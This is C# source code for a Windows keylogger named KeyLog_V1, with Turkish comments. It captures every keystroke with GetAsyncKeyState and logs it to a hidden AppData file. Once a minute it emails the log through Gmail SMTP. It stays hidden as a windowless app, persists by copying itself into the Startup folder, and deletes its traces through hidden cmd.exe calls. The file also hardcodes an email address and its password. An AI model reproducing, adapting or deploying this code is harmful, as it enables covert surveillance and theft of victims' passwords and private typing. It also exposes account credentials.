using System;
using System.Web;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;

namespace KeyLog_V1
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vkey);
        delegate void KontrolHandler();
        static int gonDakika = 1;
        static int suankiDakika = 0;
        static int dk = 0;
        static string Email = "hku.grayscale@gmail.com";
        static string Sifre = "Y3ni1'N3sil.";
        static string gonEmail = "hku.grayscale@gmail.com";
        static DateTime SilmeTarihi = DateTime.Now;

        static void Main()
        {
            suankiDakika = SuanDakika();
            KontrolHandler h = new KontrolHandler(Kontrol);
            h.BeginInvoke(new AsyncCallback(islemSonlandi), null);
            Console.ReadLine();
            Application.Run(); // referanslara System.Windows.Form ekle - Uygulamanın görünmemesi için Solution Propertiesden Windows Application yap.
        }

        static void ExpoldeYourSelf()
        {
            //    System.Diagnostics.Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\GrayKey.exe");
            //Application.Exit();

            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\GrayLog.txt",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });

            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
        {
            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\GrayKey.exe",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            FileName = "cmd.exe"
        });
        }

        // basılan tuşları teker teker ele al
        static Int16 MakeChar(Int16 key)
        {
            Int16[] keycode = { 220, 219, 222, 191, 186, 221 }, charcode = { 199, 286, 304, 214, 350, 220, 231, 287, 105, 246, 351, 252 };
            int keyIndex = Array.IndexOf(keycode, key);

            bool nocaps = (!Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys != Keys.Shift) || (Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys == Keys.Shift);
            if (nocaps && key > 64 && key < 91)
            {
                key = (Int16)(key == 73 ? 305 : key + 32);
            }
            else if (keyIndex != -1)
            {
                key = nocaps ? charcode[keyIndex + 6] : charcode[keyIndex];
            }

            Debug.Write((char)key);

            return key;
        }
        static void Kontrol()
        {
            while (true)
            {
                for (int i = 0; i < Int16.MaxValue; i++)
                {
                    if (GetAsyncKeyState(i).Equals(Int16.MinValue + 1))
                    {
                        char key = Convert.ToChar(MakeChar((Int16)i));
                    TusKaydet(key.ToString());
                    }
                }

                if (suankiDakika + gonDakika >= 60)
                {
                    dk = (suankiDakika + gonDakika) % 60;
                }
                else
                {
                    dk = suankiDakika + gonDakika;
                }
                if (SuanDakika() == dk)
                {
                    suankiDakika = SuanDakika();
                    MailGonder();
                }
            }
        }

        static void MailGonder()
        {
            string veriler = Oku();
            MailMessage mesaj = new MailMessage(Email, gonEmail, "LOG", veriler);
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
            smtp.EnableSsl = true;
            smtp.UseDefaultCredentials = true;
            smtp.Credentials = new NetworkCredential(Email, Sifre);
            smtp.Send(mesaj);

            //mail göndermek için yukarıdaki ayarlar yeterli dğeil. kullanacağınız mail adresini açıp " https://www.google.com/settings/security/lesssecureapps " adresine gidin. ve mail adresinizi güvenilir olmayan programlar tarafından kullanılmasını onaylayın. Güvenilir olmayan program da bu program oluyor.

        }

        //mail atmak içinyazdığın dosyayı oku
        static string Oku()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt", FileMode.Open, FileAccess.Read);
            StreamReader sr = new StreamReader(fs);
            string veriler = sr.ReadToEnd();
            fs.Close();
            Sil();
            return veriler;
        }

        //mail atttıktan sonra yazdığın dosyayı sil
        static void Sil()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt", FileMode.Create, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write("");
            sw.Flush();
            fs.Close();
        }

        static int SuanDakika()
        {
            string suan = DateTime.Now.ToShortTimeString();
            int dakika = int.Parse(suan.Substring(suan.IndexOf(':') + 1, suan.Length - suan.IndexOf(':') - 1));
            return dakika;
        }

        static void islemSonlandi(IAsyncResult iar)
        {
        }


        //tuşu burada dosyaya kaydet
        static void TusKaydet(string tus)
        {
            FileStream fs = null;
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt"))
                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt", FileMode.Append, FileAccess.Write);
            else
                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/GrayLog.txt", FileMode.CreateNew, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(tus);
            sw.Flush();
            fs.Close();
        }


        //çalıştırıldığında kendini başlangıç klasorne kopyala
        static void ExeKopyalama()
        {
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\GrayKey.exe"))
            {
                File.Copy(Path.GetFileName(Application.ExecutablePath), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\GrayKey.exe");
            }
        }



    }
}
